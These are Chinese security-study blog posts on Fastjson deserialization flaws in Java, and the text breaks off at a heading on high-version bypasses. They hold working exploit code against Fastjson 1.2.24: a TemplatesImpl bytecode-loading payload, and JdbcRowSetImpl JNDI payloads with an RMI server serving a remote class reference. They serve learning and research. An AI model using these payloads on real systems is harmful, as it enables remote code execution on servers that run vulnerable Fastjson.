<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentunSeriallize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;\&quot;name\&quot;:\&quot;红烧花园宝宝\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(json, Student.class, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getAge());  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/db216354/20260119144644079.png" alt="image.png"></p>
<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="反序列化时的Feature-SupportNonPublicField参数的作用"><a href="#反序列化时的Feature-SupportNonPublicField参数的作用" class="headerlink" title="反序列化时的Feature.SupportNonPublicField参数的作用"></a>反序列化时的Feature.SupportNonPublicField参数的作用</h2><p>首先这个参数的作用：带上这个参数它可以还原私有属性。<br>具体的效果<br>当我们将Student的age的setage方法去掉时，因为age的属性是私有属性，不能够直接还原如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">11</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student constructor&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;Student setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  //私有属性也不会写这个</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不加Feature.SupportNonPublicField的执行结果<br><img src="/posts/db216354/20260119151747535.png" alt="image.png"><br>加上Feature.SupportNonPublicField的执行结果<br><img src="/posts/db216354/20260119151830267.png" alt="image.png"><br>总之当我们使用JSON.parseObject的时候带上这个参数，它就可以让我们还原私有属性。</p>
<h2 id="仅使用JSON-parseObject-json"><a href="#仅使用JSON-parseObject-json" class="headerlink" title="仅使用JSON.parseObject(json)"></a>仅使用JSON.parseObject(json)</h2><p>这里测试的是不指定类型的反序列化<br>首先改一下Student类，我是加了个私有属性properties</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">11</span>;  </span><br><span class="line">    <span class="keyword">private</span> Properties properties;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student constructor&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;Student setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getProperties&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="comment">//    public void setProperties(Properties properties) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;Student setProperties&quot;);  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后反序列化类的内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line">public class StudentunSeriallize &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        String json = &quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;name\&quot;:\&quot;红烧花园宝宝\&quot;,\&quot;age\&quot;:18,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;;  </span><br><span class="line">        Object student = JSON.parseObject(json);   //这里我们不指定数据类型</span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出的内容<br><img src="/posts/db216354/20260119154611162.png" alt="image.png"><br>这里可以看到调用了，构造方法，setter方法和getter方法，同时properties的get方法调用了两次。然后这里的反序列化是没有成功的，最后返回的是JSONObject。<br><img src="/posts/db216354/20260119154835315.png" alt="image.png"><br>如果我们指定完数据类型就会成功反序列化。</p>
<h2 id="parse和parseObject的区别"><a href="#parse和parseObject的区别" class="headerlink" title="parse和parseObject的区别"></a>parse和parseObject的区别</h2><p>parse和parseObject的主要区别前者返回的是实际类型的对象，而后者返回的是JSONObject对象。<br>在反序列化时，parse会调用目标类的getter和部分特定的setter，而parseObject由于将对象转换成jsonObject对象，会执行JSON.toJSON(obj)，所以会调用所有的setter和getter方法。<br>总之，parse可以反序列化可以直接得到特定的类，而不需要像parseObject一样返回JSONObject对象（还要去设置第二个参数来进行所需要类型的返回）。<br><img src="/posts/db216354/20260119182520640.png" alt="image.png"></p>
<h1 id="Fastjson的漏洞原理"><a href="#Fastjson的漏洞原理" class="headerlink" title="Fastjson的漏洞原理"></a>Fastjson的漏洞原理</h1><p>根据以上的分析，我们了解到，@type的值是我们需要还原的类，而在执行parse或parseObject的时候会调用到这个类的setter和getter方法（需要满足特定的条件）。</p>
<ol>
<li>setter</li>
</ol>
<ul>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<ol start="2">
<li>getter</li>
</ol>
<ul>
<li>非静态方法</li>
<li>无参数</li>
<li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Fastjson的序列化和反序列化和原生的java原生的序列化和反序列化是没有关系的。<br>Fastjson 在反序列化 JSON 字符串时，允许通过 <code>@type</code> 字段指定任意类，并且在还原对象的过程中，会自动调用该类的 setter 方法（或构造函数、getter 方法）。如果被调用的方法中包含恶意代码（或能触发恶意逻辑），就会导致远程代码执行（RCE）。</p>
<ul>
<li>注意点：我们知道在序列化和反序列化的时候是可以指定数据类型的，如果类型太大或者是有很多子类，那么我们就会有很大的利用空间。</li>
</ul>
<hr>
<p>第一种(指定数据类型)：<code>Student obj = JSON.parseObject(text, Student.class);</code><br>如果Student有能够被调用的setter或者getter方法，并且存在恶意方法的话，就会成为漏洞点。<br>第二种(未指定数据类型)：<code>Object obj = JSON.parseObject(text, Object.class);</code><br>如果text的子类的能被调用的getter或者setter中存在恶意方法，就会造成漏洞。</p>
<h2 id="poc的写法"><a href="#poc的写法" class="headerlink" title="poc的写法"></a>poc的写法</h2><p>一般的poc写法为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,</span><br><span class="line">&quot;xxx&quot;:&quot;xxx&quot;,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反序列化的这个类中要存在两个条件：</p>
<ol>
<li>类的setter和getter中要有恶意方法</li>
<li>属性是可以控制的</li>
</ol>
<h2 id="漏洞的实现"><a href="#漏洞的实现" class="headerlink" title="漏洞的实现"></a>漏洞的实现</h2><p>Student</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">11</span>;  </span><br><span class="line">    <span class="keyword">private</span> Properties properties;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student constructor&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;Student setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getProperties&quot;</span>);  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="comment">//    public void setProperties(Properties properties) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;Student setProperties&quot;);  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>StudentunSeriallize</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentunSeriallize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;name\&quot;:\&quot;红烧花园宝宝\&quot;,\&quot;age\&quot;:18,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parse(json);  </span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/db216354/20260119185930391.png" alt="image.png"><br>getProperties方法被调用触发了恶意代码实现命令执行。</p>
<h2 id="漏洞的分析"><a href="#漏洞的分析" class="headerlink" title="漏洞的分析"></a>漏洞的分析</h2><p>执行点就在这里，就不细看了<br><img src="/posts/db216354/20260119191152751.png" alt="image.png"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#0x06-%E5%B0%8F%E7%BB%93">Java反序列化Fastjson篇01-FastJson基础 | Drunkbaby’s Blog</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Fastjson</category>
      </categories>
  </entry>
  <entry>
    <title>fastjson2</title>
    <url>/posts/422832ee/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从fastjson的1.2.24版本开始</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>jdk用的是8u65（方便一点，高版本的话还得进行绕过）<br>Maven 3.6.3<br>1.2.22 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.24</p>
<hr>
<p>依赖导入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;4.0.9&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;2.5&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-codec&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;1.12&lt;/version&gt;  </span><br><span class="line">&lt;/dependency</span><br></pre></td></tr></table></figure>
<p>攻击链子是两条：第一条是基于TemplatesImpl，第二条是基于JdbcrowSetImpl</p>
<h1 id="基于TemplatesImpl的利用链"><a href="#基于TemplatesImpl的利用链" class="headerlink" title="基于TemplatesImpl的利用链"></a>基于TemplatesImpl的利用链</h1><p>看到TemplatesImpl我们想到的应该是cc3吧，那么这里要用到的应该就是类的加载了。<br>大致看一下流程：<br><img src="/posts/422832ee/20260121174122241.png" alt="image.png"><br>类的加载点就是这里，我们就不向里面看了（之前cc3调的也很清除了），只看TemplatesImpl这个类。<br>接着向上走<br><img src="/posts/422832ee/20260121174313781.png" alt="image.png"><br>到这里了，一个很舒服的点，因为我们第一眼就能确定它是一个getter方法对吧<br>那我们来想想怎么来构造一下exp<br>name和tfactory都不能为空要有值，然后bytecodes是我们要加载得恶意类<br>这时的exp应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">import org.apache.commons.io.IOUtils;  </span><br><span class="line">  </span><br><span class="line">import java.io.*;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">  </span><br><span class="line">public class exp &#123;  </span><br><span class="line">  </span><br><span class="line">    public static String readclass(String cl) throws IOException &#123;  </span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  </span><br><span class="line">        IOUtils.copy(new FileInputStream(new File(cl)),byteArrayOutputStream);  </span><br><span class="line">        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void main(String[] args) throws IOException &#123;  </span><br><span class="line">        ParserConfig parserConfig = new ParserConfig();  </span><br><span class="line">  </span><br><span class="line">        final String evilclasspath = &quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;;  </span><br><span class="line">        final String evilcode = readclass(evilclasspath);  </span><br><span class="line">        final String s = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;  </span><br><span class="line">  </span><br><span class="line">        String json = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot;+s+&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilcode+&quot;\&quot;],\&quot;_name\&quot;:\&quot;hshybb\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;&#125;&quot;;  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">        JSON.parseObject(json,Object.class,parserConfig, Feature.SupportNonPublicField);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是不能成功。<br>原因是<br><img src="/posts/422832ee/20260123172447708.png" alt="image.png"><br>我们想用的是getTransletInstance方法，但是他返回的是一个抽象类，可以跟进去看一下。<br><img src="/posts/422832ee/20260123172610591.png" alt="image.png"><br>能够被调用的getter方法是要满足固定条件的<br>如：<br>. getter</p>
<ul>
<li>非静态方法</li>
<li>无参数</li>
<li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li>
</ul>
<p>所以我们要重新找一下，到newTransformer，在到<br><img src="/posts/422832ee/20260123172720398.png" alt="image.png"><br>这个getter方法<br><img src="/posts/422832ee/20260123173317807.png" alt="image.png"><br>他的返回值正好也是继承map，可以利用。<br>最后我们构造的exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readclass</span><span class="params">(String cl)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cl)),byteArrayOutputStream);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">parserConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilclasspath</span> <span class="operator">=</span> <span class="string">&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;</span>;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilcode</span> <span class="operator">=</span> readclass(evilclasspath);  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span>+s+<span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilcode+<span class="string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;hshybb\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">        JSON.parseObject(json,Object.class,parserConfig, Feature.SupportNonPublicField);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/422832ee/20260123173849103.png" alt="image.png"></p>
<h1 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h1><p>我们先去看一下JdbcRowSetImpl这个类，主要利用的位置是setDataSourceName方法。看名字就可以知道这个是一个数据库源设置的一个方法，我们通过这个方法可以搭配rmi或者是ldap进行攻击<br>主要利用方法是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/RO\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="使用rmi进行攻击"><a href="#使用rmi进行攻击" class="headerlink" title="使用rmi进行攻击"></a>使用rmi进行攻击</h2><p>服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIserver</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://localhost:1099/remoteobject&quot;, new remoteObject());  </span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);  </span><br><span class="line"><span class="comment">//        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);  </span></span><br><span class="line"><span class="comment">//        resourceRef.add(new StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;));  </span></span><br><span class="line"><span class="comment">//        resourceRef.add(new StringRefAddr(&quot;x&quot;,&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;));  </span></span><br><span class="line">  </span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://localhost:1099/RO&quot;</span>, reference);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/RO\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(json);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="使用ldap进行攻击"><a href="#使用ldap进行攻击" class="headerlink" title="使用ldap进行攻击"></a>使用ldap进行攻击</h2><p><img src="/posts/422832ee/20260123201616480.png" alt="image.png"><br>正好这里有我们之前bind好的，直接改个exp试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(json);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/422832ee/20260123201731318.png" alt="image.png"></p>
<h2 id="高版本的绕过"><a href="#高版本的绕过" class="headerlink" title="高版本的绕过"></a>高版本的绕过</h2><p>因为这里是关联到jndi的，所以绕过方法也是一样的<br>服务端</p>
